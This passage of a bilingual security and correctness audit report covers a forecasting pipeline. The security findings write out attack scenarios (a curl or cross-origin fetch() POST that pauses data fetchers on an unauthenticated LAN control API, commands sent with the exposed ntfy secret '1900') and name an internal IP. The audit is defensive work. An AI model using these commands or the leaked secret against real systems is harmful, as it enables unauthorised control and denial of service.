- **说明**：Root cause is a design one: a guessable shared secret transmitted in cleartext over a public broker gives no real protection. Rotate the secret, but more importantly move to an authenticated/private channel (ntfy access tokens + protected topic, or a private broker). The live secret in macro-scan/docker-compose.yml is gitignored, but the value is thoroughly leaked in the tracked docs/source above.
- **触发场景/影响**：The command channel is the public topic ***REMOVED*** on ntfy.sh (world-readable AND world-writable, no ACL). The only gate is a shared secret prefix (parse_command in ntfy_listener.py checks parts[0] == NTFY_CMD_SECRET). That secret is the 4-digit '1900', disclosed across many tracked files. An attacker publishes e.g. `1900 hypothesis ... deep` or `1900 pause <fetcher>` / spawns arbitrary fetcher subprocesses, driving LLM cost and disrupting the pipeline. Worse: because the secret is sent as the first token of every command over a public topic, any subscriber harvests it in cleartext even if it were strong.
- **证据**：TuiYan_CHANGELOG.md:3030  「密钥：1900（docker-compose.yml NTFY_CMD_SECRET，原为 <OLD_NTFY_SECRET_REDACTED>，2026-05-23 改）」— leaks BOTH the current secret and the previous one. Also: macro-scan/AGENTS.md:210 `NTFY_CMD_SECRET=1900`; ntfy_listener.py:324 hardcodes `1900 confirm_situation` in push text; docs/overview.md:59-68, INDEX.md:184-191, 世界推演系统_人类说明文档.md:125-146 all document the `1900 <cmd>` format; docker-compose.example.yml:33-34 exposes the topic names ***REMOVED*** / ***REMOVED***.
- **交叉验证**：2 个独立 skeptic — skeptic1=CONFIRMED(sev→High)；skeptic2=CONFIRMED(sev→Medium)

### [H15] High · CONFIRMED（skeptic 修正建议：Medium/Medium） — macro-scan(天枢)

- **位置**：`macro-scan/核心代码/control_server.py:58`
- **类别**：cors-misconfig｜**审查维度**：security
- **问题**：CORS allow_origins=["*"] 且 allow_methods/headers 全开,任意网站可跨域驱动控制 API;在默认空 token 下浏览器侧无 CSRF 门槛。
- **说明**：应限定 allow_origins 到开阳面板实际来源。注意:token 已设置时因鉴权走 Authorization 头(非 cookie)可缓解 CSRF,但 * 通配仍允许任意源发起并读回响应,且与 fail-open token 叠加危害放大。
- **触发场景/影响**：LAN 用户浏览器打开恶意网页,页面 JS `fetch('http://192.168.31.108:8900/api/v1/control/fetchers/fred_fetch/pause',{method:'POST'})`。因 allow_origins=* 浏览器放行跨域;token 未设置时无需凭证,采集被暂停;* 还允许读取响应体。
- **证据**：line58-63: `app.add_middleware(CORSMiddleware, allow_origins=["*"], allow_methods=["*"], allow_headers=["*"])`
- **交叉验证**：2 个独立 skeptic — skeptic1=PLAUSIBLE(sev→Medium)；skeptic2=CONFIRMED(sev→Medium)

### [H16] High · CONFIRMED（skeptic 修正建议：High/Critical） — macro-scan(天枢)

- **位置**：`macro-scan/docker-compose.yml:21`
- **类别**：secret-exposure｜**审查维度**：security
- **问题**：Live API keys and the ntfy command secret are hardcoded in a git-TRACKED docker-compose.yml, so they are committed to version control despite being listed in .gitignore.
- **说明**：Anyone with read access to the repo/history obtains working credentials for FRED, SiliconFlow, Xiaomi token-plan, MiniMax, EIA, plus the ntfy command secret. Rotate all keys, `git rm --cached` the compose files, move secrets to an untracked .env / env-file, and scrub history.
- **触发场景/影响**：A developer clones the repo (or the git history leaks); every embedded key is a valid, usable credential and NTFY_CMD_SECRET=1900 unlocks the remote command channel.
- **证据**：Lines 21-36 contain real values: FRED_API_KEY=<FRED_KEY_REDACTED>, SILICONFLOW_API_KEY=<SK_KEY_REDACTED>, OPENAI_COMPAT_KEY=<OPENAI_COMPAT_KEY_REDACTED>, MINIMAX_API_KEY=<MINIMAX_KEY_REDACTED>..., EIA_API_KEY=<EIA_KEY_REDACTED>, NTFY_CMD_SECRET=1900. Both root .gitignore (line 18) and macro-scan/.gitignore (line 3) list docker-compose.yml, but `git ls-files` shows macro-scan/docker-compose.yml is already tracked and `git check-ignore` returns not-ignored (exit 1) — .gitignore has no effect on already-tracked files. `git show HEAD:macro-scan/docker-compose.yml` returns the real key values. macro-ji/docker-compose.yml is also tracked and embeds the same FRED_API_KEY. (macro-sim/docker-compose.yml correctly uses ${VAR} substitution.)
- **交叉验证**：2 个独立 skeptic — skeptic1=CONFIRMED(sev→High)；skeptic2=CONFIRMED(sev→Critical)

### [H17] High · CONFIRMED（skeptic 修正建议：High/Medium） — macro-scan(天枢)

- **位置**：`macro-scan/核心代码/control_server.py:382`
- **类别**：missing-authentication｜**审查维度**：security
- **问题**：The Control API is served on 0.0.0.0:8900 with authentication effectively disabled (CONTROL_TOKEN unset in the deployment) and CORS wide open, letting any LAN host drive fetcher operations.
- **说明**：Anyone on the LAN (or, via CORS:* + no-auth, a malicious web page opened by a LAN user) can pause all data fetchers (DoS), rerun jobs, or rewrite schedules. Rerun is whitelisted so it is not arbitrary RCE, but it is an unauthenticated control plane. Set CONTROL_TOKEN in production, bind to 127.0.0.1 or an internal network, and restrict CORS.
- **触发场景/影响**：curl -X POST http://<nas-lan-ip>:8900/api/v1/control/fetchers/<id>/pause with no auth header succeeds; looping pause across the known fetcher IDs halts all data collection.
- **证据**：control_server.py:382 `uvicorn.run(app, host="0.0.0.0", port=port)`; :48 `CONTROL_TOKEN = os.environ.get("CONTROL_TOKEN", "")`; :68-69 `if not CONTROL_TOKEN: return  # 未配置 token 则跳过鉴权`; :58-63 CORS `allow_origins=["*"]`. docker-compose.yml:8 publishes `"8900:8900"` (binds 0.0.0.0 on the host) and its environment block sets no CONTROL_TOKEN, so _check_token is a no-op. entrypoint.sh:22 starts it. Endpoints include POST /fetchers/rerun (spawns subprocesses via subprocess.Popen), /pause, /resume, PUT /schedule.
- **交叉验证**：2 个独立 skeptic — skeptic1=CONFIRMED(sev→High)；skeptic2=CONFIRMED(sev→Medium)
- **主 Agent 人工复核**：主 Agent 源码级确认：line 382 host='0.0.0.0'；macro-scan/docker-compose.yml line 8 映射 '8900:8900'。叠加空 token（见 :48）→ 任意可达 8900 端口的 LAN 主机零凭证可 pause/rerun/改调度。CORS allow_origins=['*']（line 60）进一步允许任意网站跨域驱动。属实爆而非潜在。

### [H18] High · PLAUSIBLE — macro-sim(天璇)

- **位置**：`macro-sim/run.py:713`
- **类别**：data-contract-shared-file｜**审查维度**：data-contracts-tz
- **问题**：macro-sim destructively empties sim_trigger.json, which kaiyang reads as a persistent status feed on the same shared volume, so the '推演触发' badge is defeated.
- **说明**：docker-compose confirms all three subsystems bind the SAME host dir /vol2/1000/software/macro-scan/data (macro-sim: /app/macro_data:rw; kaiyang nginx: /usr/share/nginx/data:ro). grv_threshold._write_sim_trigger (S:/world-sim/macro-scan/核心代码/grv_threshold.py:229-249) writes sim_trigger.json with triggered:true specifically so kaiyang StatusBar lights the badge (see the P1-fix comment at grv_threshold.py:241-242). But the macro-sim daemon polls the same file and, immediately after reading, does TRIGGER_PATH.write_text("") to empty it (one-shot message-queue semantics). kaiyang treats the same file as a persistent status feed (StatusBar.tsx:65,75: triggered = simData?.triggered === true). The two consumers have incompatible read contracts on one shared file: macro-sim wipes the flag within one poll cycle, so kaiyang almost never sees triggered:true, and after wipe the file is the empty string '' → kaiyang fetchJson → JSON.parse('') throws (swallowed only because 'simTrigger' is in KNOWN_STRUCTURAL_MISSING at StatusBar.tsx:80).
- **触发场景/影响**：GRV threshold fires → grv_threshold writes sim_trigger.json {triggered:true,...}. Within seconds the macro-sim daemon loop (run.py:707-713) reads it and calls write_text(''). When a kaiyang user's browser next fetches sim_trigger.json it gets '' (parse error) or a stale wipe, so the '推演触发' badge stays green ('推演未触发') even though an auto-simulation was just triggered — the documented P1 badge fix is silently defeated in the real shared-volume deployment.
- **证据**：run.py:713  TRIGGER_PATH.write_text("")  # 清空  ;  grv_threshold.py:243 "triggered": True  (# ...StatusBar「推演触发」badge 永不亮) ; docker-compose: macro-sim '/vol2/1000/software/macro-scan/data:/app/macro_data:rw' & kaiyang '/vol2/1000/software/macro-scan/data:/usr/share/nginx/data:ro'
- **交叉验证**：2 个独立 skeptic — skeptic1=PLAUSIBLE；skeptic2=PLAUSIBLE

### [H19] High · PLAUSIBLE — macro-sim(天璇)

- **位置**：`macro-sim/core/world_state.py:558`
- **类别**：null-vs-default-crash｜**审查维度**：data-contracts-tz
- **问题**：load_from_macro_scan uses grv.get(key, default) on GRV dimensions that the producer always writes but may set to null, causing TypeError arithmetic when GRV degrades to stub/partial.
- **说明**：geo_risk_vector.compute_grv() ALWAYS includes taiwan_strait/us_china_strategic/russia_europe/middle_east_energy/global_composite in grv_latest.json (geo_risk_vector.py:766-794), but their values are None when _blend() gets no GDELT and no GPR input (e.g. source_quality='stub', or a single missing GPR CSV). In world_state.load_from_macro_scan the core dims are read with a positional default — grv.get('russia_europe', 0), grv.get('us_china_strategic', 0), grv.get('global_composite', 50.0) — but dict.get returns the default ONLY when the key is ABSENT, not when it is present-with-null. So None flows into arithmetic. Note the inconsistency: the D7 dims right below (lines 562-570) correctly use `float(grv.get('climate_risk') or 0.0)`, proving the None guard was intended but omitted for the 5 core dims.
- **触发场景/影响**：A single GPR fetch failure leaves GPR.csv (global) unreadable → geo_risk_vector emits global_composite: null (and/or taiwan_strait/russia_europe null). macro-sim live prediction calls load_from_macro_scan → line 558 (grv.get('russia_europe',0)+grv.get('taiwan_strait',0))/200 raises 'unsupported operand type(s) for +: NoneType' (or line 559 None/100, or line 634 vix = 15.0 + None*0.15). run_full_simulation aborts; run.py:715 catches it and pushes a generic '仿真失败' ntfy, masking the real cause (upstream GRV null) as an opaque failure instead of degrading gracefully.
- **证据**：world_state.py:558  grv_military = (grv.get("russia_europe", 0) + grv.get("taiwan_strait", 0)) / 200 ; :559 grv_trade = grv.get("us_china_strategic", 0) / 100 ; :556 grv_composite = grv.get("global_composite", 50.0) ; contrast :562 float(grv.get("climate_risk") or 0.0) ; producer _blend returns None (geo_risk_vector.py:433-440)
- **交叉验证**：2 个独立 skeptic — skeptic1=PLAUSIBLE；skeptic2=PLAUSIBLE

### [H20] High · PLAUSIBLE — macro-sim(天璇)

- **位置**：`macro-sim/run.py:620`
- **类别**：exception-swallow｜**审查维度**：concurrency-reliability
- **问题**：Sim prediction archival wraps all inserts + commit in a broad except that only prints; and _tianji_conn never creates the predictions/reasoning_trace tables, so a missing/empty DB makes every archive silently no-op.
- **说明**：_tianji_conn (line 487) opens/creates forecast_tracker.db and sets PRAGMAs only — it does NOT create the `predictions` or `reasoning_trace` tables it later inserts into. If the DB file is absent (recreated empty by sqlite3.connect) or schema-drifted, every conn.execute('INSERT ... INTO predictions ...') raises 'no such table', caught by the broad `except Exception` at line 620 which prints '[tianji] 存档失败（不影响主流程）' + traceback and returns with archived=0. No ntfy, no probe (see probe gap). Note macro-scan retired this SQLite (forecast_tracker._connect raises if the file is missing unless WORLDSIM_SQLITE_OFF=1), yet the sim unconditionally re-creates it — a cross-container lifecycle contradiction. Also no busy_timeout is set, so a concurrent writer yields an immediately-swallowed 'database is locked'.
- **触发场景/影响**：After P6 SQLite deletion, the next macro-sim run recreates forecast_tracker.db empty. INSERT INTO predictions raises 'no such table: predictions' on every path; the whole block is swallowed; sim keeps reporting a successful run via ntfy while archiving 0 predictions indefinitely.
- **证据**：def _tianji_conn(): conn=_sq3.connect(...); conn.execute("PRAGMA journal_mode=WAL"); ... (no CREATE TABLE) ... ; _archive_to_tianji: conn.execute("INSERT OR IGNORE INTO predictions ...") ... except Exception as e: print(f"[tianji] 存档失败（不影响主流程）：{e}")
- **交叉验证**：2 个独立 skeptic — skeptic1=PLAUSIBLE；skeptic2=PLAUSIBLE

### [H21] High · CONFIRMED — 其它

- **位置**：`core/simulation.py:412`
- **类别**：correctness｜**审查维度**：sim-correctness
- **问题**：consecutive_negative_steps is reset to 0 the instant it reaches 3, so the VIX sentiment-collapse bleed rule and cascade detector (both gated on >=3) can never fire.
- **说明**：In gm_resolve_rules the counter is incremented by at most +1 per step (line 391) and then, at lines 408-412, whenever it reaches >=3 it forces A7/A12 activation AND immediately sets world.consecutive_negative_steps = 0. Because gm_resolve_rules runs in Phase 2 and apply_bleed_rules runs in Phase 3 of the SAME step (simulation.py:500 then :506), the counter is already back to 0 (or 1/2) by the time bleed rule 1 reads it. The stored counter therefore never exceeds 2 across the whole run. Bleed rule 1 in world_state.py:287-289 requires consecutive_negative_steps >= params['vix_bleed_steps'] (=3), and get_first_cascade_step (simulation.py:590-594) requires snapshot value >=3 — both are structurally unreachable. The snapshot written to history (to_dict includes consecutive_negative_steps) also only ever shows 0/1/2.
- **触发场景/影响**：A run where market_sentiment stays < -0.5 for many consecutive months: the sequence of stored consecutive_negative_steps is 1,2,0,1,2,0,... It hits 3 only transiently inside gm_resolve before the line-412 reset. apply_bleed_rules therefore never adds the vix_bleed_rate rise, so a genuine sustained-panic scenario produces no VIX escalation from rule 1 and get_first_cascade_step always returns None — the model silently omits the very tail-risk amplification it was built to capture.
- **证据**：line 391: world.consecutive_negative_steps += 1 ... line 408: if world.consecutive_negative_steps >= 3: ... line 412: world.consecutive_negative_steps = 0  # then apply_bleed_rules (world_state.py:288) tests consecutive_negative_steps >= params['vix_bleed_steps']
- **交叉验证**：2 个独立 skeptic — skeptic1=CONFIRMED；skeptic2=CONFIRMED

### [H22] High · CONFIRMED — 其它

- **位置**：`core/bifurcation.py:431`
- **类别**：probability-aggregation｜**审查维度**：sim-correctness
- **问题**：Path probabilities do not sum to 1: runs in sub-threshold clusters are silently discarded rather than reassigned, so reported path percentages lose mass.
- **说明**：_cluster_runs (line 176) filters out any cluster with len(c)/n < MIN_PATH_PROBABILITY (0.05), and run_prediction additionally skips them (line 430-431: if prob < MIN_PATH_PROBABILITY: continue). Each surviving path's probability is len(cluster)/n_runs where n_runs is the FULL 100, never renormalized to the kept clusters. Discarded runs' probability mass simply vanishes — it is not merged into the nearest cluster. The _cluster_runs docstring explicitly claims the opposite ('低于10%的簇会被合并到最近的簇' — merged into the nearest cluster), so the implementation contradicts its own contract and the design intent for the probability path tree.
- **触发场景/影响**：100 MC runs cluster into 60 / 37 / 3. The 3-run cluster is dropped. The report and _archive_to_tianji record path A = 60% and path B = 37% (sum 97%), and the b_prob/final_prob written to the tianji predictions table (run.py:556-559) are likewise un-normalized. Downstream scoring that assumes probabilities partition the outcome space is fed values that do not sum to 1, and 3% of simulated outcomes (including any extreme tail runs that landed in the small cluster) are erased from the forecast.
- **证据**：line 176: filtered = [c for c in clusters if len(c) / n >= MIN_PATH_PROBABILITY]  (docstring line 149-150 says '低于10%的簇会被合并到最近的簇'); line 430: prob = len(cluster) / n_runs; line 431: if prob < MIN_PATH_PROBABILITY: continue
- **交叉验证**：1 个独立 skeptic — skeptic1=CONFIRMED

## 4. Medium 发现（汇总表）

| ID | 位置 | 类别 | 验证 | 问题 |
|---|---|---|---|---|
| M01 | `kaiyang/src/hooks/useOperationPolling.ts:42` | state-management | CONFIRMED | 轮询器只在 TianshuTab 挂载时运行；操作进行中关闭抽屉/切 Tab 会搁置 pendingOps 与锁定态 |
| M02 | `kaiyang/src/control/FrequencySelector.tsx:50` | error-handling | CONFIRMED | 401 处理不一致：allowed-schedules 的 401 被当作“API 不可用”降级掩盖；updateSchedule 的 401 不清 Token |
| M03 | `kaiyang/src/control/FetcherCard.tsx:41` | timestamp-timezone | PLAUSIBLE | relativeTime 用裸 new Date(iso) 未走 parseTs，无时区后缀的时间戳在非北京时区浏览器会算错，非法值显示“NaN天前” |
| M04 | `kaiyang/src/components/StatusBar.tsx:137` | field-name-mismatch | PLAUSIBLE | kaiyang reads sim_trigger.reason for the trigger tooltip, but the producer writes the descriptive text in fiel |
| M05 | `kaiyang/src/config/controlConfig.ts:38` | token-storage-xss | PLAUSIBLE | Bearer token 明文存于 localStorage,任意 XSS 可通过 localStorage.getItem('kaiyang_control_token') 直接读取窃取。 |
| M06 | `kaiyang/src/config/controlConfig.ts:11` | plaintext-transport-hardcoded-ip | PLAUSIBLE | 默认 API_BASE_URL 硬编码内网 IP 且用明文 http://,Bearer token 在 LAN 上以明文传输,可被嗅探。 |
| M07 | `kaiyang/nginx/default.conf:23` | information-exposure | CONFIRMED | The nginx frontend on 0.0.0.0:8080 serves the entire macro-scan runtime data directory at /data/, exposing int |
| M08 | `macro-ji/tianji_verifier.py:265` | logic-window-inversion | CONFIRMED | Reweight trigger evaluates the OLDEST N Brier scores of a group, not the most recent N, contradicting the 'con |
| M09 | `macro-ji/weight_matrix.py:280` | silent-safety-check-failure | CONFIRMED | Herfindahl over-concentration check is a no-op because the live grv_weights.yaml has no baseline_snapshot (it  |
| M10 | `macro-ji/weight_matrix.py:153` | constraint-bypass | CONFIRMED | The ±25% rate-limit clip is per single call against the freshly re-read current value; repeated approvals comp |
| M11 | `macro-ji/weight_matrix.py:187` | silent-audit-loss | CONFIRMED | Weight-update audit logging is wrapped in try/except: pass in both apply_weight_adjustment and reject_adjustme |
| M12 | `macro-ji/verify_watchdog.py:60` | idempotency-race | CONFIRMED | The watchdog marks completion by rewriting the stale in-memory trigger read before a ≤600s run, so any new tri |
| M13 | `macro-scan/核心代码/scan_weak_signals.py:925` | robustness | CONFIRMED | Partial GDELT fetch (flaky network) silently overwrites gdelt_scores.json with depressed scores; no minimum-fi |
| M14 | `macro-scan/核心代码/fetch_rss_news.py:73` | robustness | CONFIRMED | feedparser.parse(url) is called with no timeout; a hanging external feed can block the weak-signal scan indefi |
| M15 | `macro-scan/核心代码/geo_risk_vector.py:182` | stale-data | CONFIRMED | GRV consumes gdelt_scores.json with no freshness check, so a multi-day GDELT outage yields stale geopolitical  |
| M16 | `macro-scan/核心代码/grv_threshold.py:229` | correctness | CONFIRMED | _write_sim_trigger's docstring promises idempotent merge (append event, don't overwrite an unconsumed trigger) |
| M17 | `macro-scan/核心代码/geo_risk_vector.py:484` | correctness | CONFIRMED | middle_east_energy applies channel_b_bonus as a flat +15.0 step at WTI>95 (not a 0.15 weight), creating a 15-p |
| M18 | `macro-scan/核心代码/scheduler.py:277` | correctness | CONFIRMED | C7 restart-recovery restores _last_run_ts (only used for state-dump display) but not the last_run dict that ac |
| M19 | `macro-scan/核心代码/hybrid_llm.py:355` | error-handling | CONFIRMED | reason() auto-mode returns a non-empty placeholder string containing the first 1000 chars of the raw prompt on |
| M20 | `macro-scan/config/grv_weights.yaml:1225` | config-structure-mismatch | PLAUSIBLE | gci and its 65+ scenario-event weights live under slow_variables_weights, but the reweight/read/write code onl |
| M21 | `macro-scan/核心代码/scheduler.py:277` | race-idempotency | PLAUSIBLE | The C7 restart-recovery restores _last_run_ts (a display-only dict never consulted for dedup) instead of last_ |
| M22 | `macro-scan/核心代码/verify_predictions.py:312` | correctness-contract | PLAUSIBLE | run_verification accepts dry_run but never honors it — the file write at line 348 is unconditional, so --dry-r |
| M23 | `macro-scan/核心代码/prediction_logger.py:127` | race | PLAUSIBLE | _save_log claims to prevent concurrent-write loss but read-modify-write is not atomic and the .tmp path is a f |
| M24 | `macro-scan/核心代码/tianji_db.py:329` | correctness-regression | CONFIRMED | get_narrative_chunks_for_dimension staleness scoring is silently dead after migration: pg_read._norm returns t |
| M25 | `macro-scan/核心代码/signal_synthesizer.py:281` | timezone | CONFIRMED | synthesis_log.triggered_at is written as a tz-naive string (offset stripped by [:19]) into a timestamptz colum |
| M26 | `macro-scan/核心代码/pg_read.py:133` | error-handling | CONFIRMED | The read layer cannot distinguish 'PG unavailable' from 'no rows': connect() returns None and exec_read return |
| M27 | `macro-scan/核心代码/control_server.py:216` | path-traversal | PLAUSIBLE | get_logs 用未校验的 fetcher_id 直接 os.path.join(LOG_DIR, f"{fetcher_id}.log") 读文件,存在路径穿越读任意 .log 文件风险。 |
| M28 | `macro-scan/核心代码/control_server.py:310` | input-validation | PLAUSIBLE | pause/resume 的 fetcher_id 无白名单校验,任意字符串被写入 control_pause.json 的 paused 集合。 |
| M29 | `macro-scan/核心代码/ntfy_listener.py:74` | weak-authentication | CONFIRMED | The bidirectional ntfy command channel is guarded only by a 4-digit shared secret ('1900') sent as plaintext t |
| M30 | `macro-scan/Dockerfile:34` | container-hardening | CONFIRMED | Containers run as root (no USER directive in Dockerfile, no user: in compose) while bind-mounting host source  |
| M31 | `macro-sim/run.py:533` | idempotency | PLAUSIBLE | Archival uses INSERT OR IGNORE keyed on a fresh random uuid4 primary key, so the OR IGNORE can never dedupe —  |
| M32 | `macro-sim/.env:1` | plaintext-secret | CONFIRMED | A real, active SiliconFlow API key sits in plaintext in a .env file on the shared NAS. |
| M33 | `core/bifurcation.py:162` | correctness | CONFIRMED | n_clusters==1 falls through to the 3-cluster branch, so a converged (tight) distribution is force-split into u |
| M34 | `core/simulation.py:66` | silent-failure | PLAUSIBLE | A missing/misplaced soul file is swallowed by a bare `except FileNotFoundError: pass`, silently reverting the  |

## 5. Low 发现（汇总表）

| ID | 位置 | 类别 | 验证 | 问题 |
|---|---|---|---|---|
| L01 | `kaiyang/src/state/ControlContext.tsx:141` | state-management | CONFIRMED | 挂载时“持久化日志”effect 先于 SET_LOGS 生效运行，用空数组瞬时覆盖 localStorage 中已存日志 |
| L02 | `kaiyang/src/control/ControlDrawer.tsx:49` | fragility | CONFIRMED | 关闭抽屉靠 document.querySelector 按 title 文案匹配按钮并 .click()，与抽屉自身关闭箭头 title 冲突，仅因 DOM 顺序侥幸不自触发 |
| L03 | `macro-ji/tianji_verifier.py:384` | misleading-report-label | CONFIRMED | Sharpness is reported with the label '（>30%或<70%比例）', which is logically always 100%; the computation is corre |
| L04 | `macro-ji/tianji_verifier.py:71` | fragile-data-assumption | PLAUSIBLE | _fetch_fred_value returns candidates[-1] relying on the CSV being in ascending date order rather than sorting  |
| L05 | `macro-scan/核心代码/scan_weak_signals.py:143` | correctness | CONFIRMED | scan_fred merges full CSV history with the last-14-day FRED pull, appending out-of-order duplicate dates into  |
| L06 | `macro-scan/核心代码/fetch_gpr.py:88` | robustness | CONFIRMED | _parse_date_col does astype(int) on year/month columns; a trailing blank/NaN row aborts the entire GPR fetch. |
| L07 | `macro-scan/核心代码/fetch_rss_news.py:66` | robustness | CONFIRMED | os.environ.setdefault('http_proxy') leaks the NAS proxy into the whole process, routing later internal RSSHub  |
| L08 | `macro-scan/核心代码/hybrid_llm.py:261` | error-handling | CONFIRMED | call_claude dereferences msg.content[0].text with no empty-content guard, unlike call_minimax and call_openai_ |
| L09 | `macro-scan/核心代码/grv_threshold.py:237` | schema-contract-drift | PLAUSIBLE | sim_trigger.json omits _schema_version and 'updated', and writes 'level' as an int while contracts.ts types it |
| L10 | `macro-scan/核心代码/scheduler.py:345` | reliability | PLAUSIBLE | Daily jobs use exact HH:MM string equality with a 30s poll and no catch-up, so a slow loop iteration or clock  |
| L11 | `macro-scan/核心代码/pg_write_collection.py:207` | concurrency | PLAUSIBLE | _next_id computes MAX(id)+1 in a separate transaction from the insert; the single-writer assumption is not gua |
| L12 | `macro-scan/核心代码/signal_synthesizer.py:340` | timezone | CONFIRMED | _get_today_synthesis_count derives 'today' from datetime.now() (naive local time) instead of UTC, so the daily |
| L13 | `macro-scan/核心代码/silent_failure_probe.py:126` | error-handling | CONFIRMED | If the .sqlite_frozen_at marker exists but cannot be parsed, frozen_at is set to 0, making the 'SQLite still b |
| L14 | `macro-scan/核心代码/control_server.py:71` | timing-attack | PLAUSIBLE | token 比较使用普通 != 非常量时间比较,理论上存在时序侧信道推测 token 的风险。 |
| L15 | `macro-scan/核心代码/control_server.py:374` | unauth-info-endpoint | CONFIRMED | /health 端点无 _check_token,可无鉴权探测服务存活(信息暴露,危害有限)。 |
| L16 | `macro-sim/core/world_state.py:710` | scale-contract-violation | PLAUSIBLE | grv_dimensions is built by copying every numeric key from grv_latest.json, pulling raw GPR index gpr_twn_raw ( |
| L17 | `core/agents/base.py:310` | dead-parameter | PLAUSIBLE | decision_temperature only acts as a 0-vs-nonzero switch; any positive value produces identical standard weight |
| L18 | `core/agents/sovereign.py:50` | maintainability-trap | CONFIRMED | sovereign.py redefines _eval_trigger, shadowing the base import with weaker semantics (missing vars -> 0.0, no |
| L19 | `core/bifurcation.py:372` | monte-carlo | CONFIRMED | MC uses sequential integer seeds 0..99 and reseeds the global RNG each run with the same seed used for initial |

---

## 6. 审查方法与交叉验证审计

### 6.1 波次编排（Workflow 多 Agent 多轮）

| 波次 | 做什么 | Agent 数 / 编排 |
|---|---|---|
| **Wave 0 建图** | 5 个 reader 并行为各子系统产出结构化地图（入口/数据流/关键模块/依赖/风险热点/`file:line`），见附录 A | 5 并行 |
| **Wave 1 Finder** | 按 4 维度 × 子系统单一透镜找问题，返回结构化发现 | ~9–11 并行（分批，≤12 并发） |
| **Wave 2 对抗验证** | 每条发现由 **2 个视角各异的独立 skeptic** 判定：一个"能否实际复现"透镜，一个"是否 live 生产代码而非死代码/测试桩"透镜；默认倾向 refute，多数确认才保留 | pipeline，每批发现 ≤6 条（×2 skeptic=12 并发） |
| **Wave 3 完备性批评** | 批评 agent 找"哪块没审/哪条未验证"，缺口喂回定向 finder（loop-until-dry） | 循环，≤2 轮 |
| **Wave 4 综合+人工复核** | 去重、按严重度排序、跨发现关联；**主 Agent 亲自复读全部 Critical + 部分 High 的源码**做最终人工复核 | 主 Agent |

### 6.2 判定逻辑

- `finalVerdict`：全部 skeptic 否决 → **REJECTED**（不入报告）；≥1 个确认 → **CONFIRMED**；否则 **PLAUSIBLE**。
- skeptic 可给"修正严重度"建议（如把安全项按"家用内网可信"下调），主 Agent 在 Wave 4 对 Critical/High 逐条裁定是否采纳——**C02/C03 即被 skeptic 建议下调为 Medium，但主 Agent 用"全仓 compose 均未设 CONTROL_TOKEN"的源码证据推翻其"内网可信"前提，维持 Critical。**

### 6.3 诚实性与过程可追溯（含本次两处偏差修复）

遵循 facts-vs-assumptions 铁律：报告中**不含任何未在工具输出/源码中亲眼见到的对象名或猜测**；不确定处显式标注（如 C01 已注明"以磁盘源码为准，部署镜像若为旧版可能不同"）。本次审查过程中出现并**如实修复**的两处偏差：

1. **e0c 与 security 两个 finder 在初轮 Workflow 中因 "Connection lost" 失败**：未静默丢弃，而是重跑了一个 e0c+security 迷你 Workflow 补齐。
2. **补跑时 security agent 一次返回"目标代码库不可访问"占位结果**（NAS 网络挂载盘对该 agent 瞬时不可达）：经检查 journal 发现 → 验证 `S:\` 实际可达 → 过滤掉该占位 → 另起专门的 security-only Workflow（3 子 finder + 重试指引）补齐。安全维度最终 18 条发现即来自该补齐轮。

### 6.4 交叉验证审计汇总

- 全部 79 条均经 **≥2 个独立 skeptic** 判定；`REJECTED` 项已在综合阶段剔除，不计入本报告。
- 4 条 Critical 全部为 `CONFIRMED` 且经主 Agent **源码级**复核（逐条见 §2 的"主 Agent 人工复核"行）。
- C04（GitHub PAT）为 Wave 4 主 Agent 人工复核**净新增**——初轮 finder 仅提到"存在 GitHub 远程"，未单独标记内嵌 PAT。


---

## 7. 覆盖度说明

### 7.1 审了什么

- **四维度全覆盖**：E0-C PG 迁移（读/写路径、双写残留、`sqlite3.connect` 违规、fail-fast、schema 漂移）、数据管道与契约（跨系统 JSON schema、时区、静默失败）、正确性/逻辑（GRV 数学/单位/边界、MC 采样/agent/soul、前端逻辑、Brier/校准/权重 clip）、安全（密钥/git、control :8900 暴露面、SQL、部署/容器）。
- **并发/可靠性专项**：调度锁/竞态、文件写原子性、幂等、探针覆盖面。
- **五子系统建图**：见附录 A（Wave 0 精简产出）。

### 7.2 跳过什么及原因

- **测试桩 / 一次性迁移脚本**的历史死路径：仅在其可能被误重跑造成破坏时才纳入（如 `b0_migrate` 无 `mode=ro` 可静默建空库——已作为 Medium 纳入）。
- **前端第三方 `any` 封装**（globe.gl/three.js）：仅记类型安全风险热点，未逐行审第三方库本身。
- **运行时实证**：本审查为**纯静态只读**，未在运行容器内执行、未连 PG、未跑仿真。凡涉及"运行实例是否与磁盘源码一致"的判断（尤其 C01），均已显式标注需在容器内复核。

### 7.3 未上线组件就绪度专节（玉衡 / 瑶光 / 天权）

| 组件 | 定位与现状（据 `docs/arch_review_20260802.md` 裁定 + 本次源码核实） | 就绪度 | 关键隐患（对应发现） |
|---|---|---|---|
| **玉衡**（权重反馈/审批治理） | `weight_matrix.py` 同时存在于 `macro-ji/` 与 `macro-scan/核心代码/`（两份副本）；裁定"并入天玑 V2、不独立成星"。双层 clip（变化速率 ±25% + 绝对值 [0.05,5.0]）与待审批队列代码**完整可跑** | **代码就绪、数据未通** | ① "评分→校准→权重反馈"链空转数月（`predictions` 无真实数据，`MIN_TRIGGER_N=8` 从未触达）；② `weight_update_log` 恒 0 行，且 `apply_weight_adjustment` 内 `log_weight_update` 被 `try/except: pass` 吞没，**未来真审批时日志失败也不可感知**；③ `grv_weights.yaml` 由人工审计生成、缺 `baseline_snapshot` → Herfindahl 集中度检查 ratio 恒 1.0 **恒不告警**；④ `slow_variables_weights.gci` 节下误挂 65+ 情景权重，读取路径找不到、被当默认值忽略 |
| **瑶光**（可观测性） | 降级为天枢 `observability.py` 的三数字 ntfy 健康推送；裁定永久关闭独立立项 | **部分就绪、监控失真** | `daily_health_push()` 走 **PG schema `tianji.predictions`** 查行数，而天玑实际用 **SQLite `forecast_tracker.db`** → PG 不可用时显示 -1/"DB 不存在"，PG 可用但 schema 未同步时显示 0 触发**误报"数据链断路"**。健康监控无法真实反映天玑运行状态——这正是上面链路空转"数月无人察觉"的直接原因 |
| **天权**（因果假设文档） | 降级为 `causal_assumptions.md`，状态"初稿，尚未经天玑校准" | **仅文档、代码零实现** | GRV_T/A 双层衰减、social_stress 三成分公式、middle_east_energy WTI Channel B、cultural_friction Hofstede/WVS 参数化、WUI 接入等**均仅文档化、代码层零实现**；当前所有混合权重（GDELT×0.4+GPR×0.6 等）标注 `[经验假设]`，天玑 V2 校准启动前无实证依据。另：`prior.yaml` 在仓库中完全缺失，`init_weights_from_prior()` 不可用 |

